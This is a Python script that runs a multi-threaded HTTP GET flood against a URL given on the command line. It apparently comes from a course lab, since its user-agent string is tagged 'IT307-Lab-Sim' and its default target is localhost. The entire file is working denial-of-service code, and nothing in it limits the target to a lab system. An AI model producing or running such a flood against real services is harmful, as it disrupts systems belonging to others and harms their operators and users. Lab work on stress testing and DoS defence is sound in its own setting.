import sys
import time
import threading
import requests

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "DDoS-Test-Bot/1.0"
]

def http_worker(target_url, num_requests, results_counter):
    for _ in range(num_requests):
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) IT307-Lab-Sim"}
            res = requests.get(target_url, headers=headers, timeout=2)
            results_counter["success"] += 1
        except Exception:
            results_counter["errors"] += 1
        time.sleep(0.01)

def launch_http_flood(target_url, total_requests=400, concurrency=15):
    """
    Multi-threaded HTTP GET flood simulating layer 7 application stress.
    """
    print(f"[*] Starting HTTP Flood on {target_url} ({total_requests} reqs across {concurrency} threads)...")
    reqs_per_thread = total_requests // concurrency
    threads = []
    stats = {"success": 0, "errors": 0}

    for _ in range(concurrency):
        t = threading.Thread(target=http_worker, args=(target_url, reqs_per_thread, stats))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(f"[+] HTTP Flood finished. Successful requests: {stats['success']}, Failed/Dropped: {stats['errors']}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/"
    reqs = int(sys.argv[2]) if len(sys.argv) > 2 else 300
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    launch_http_flood(target, reqs, threads)
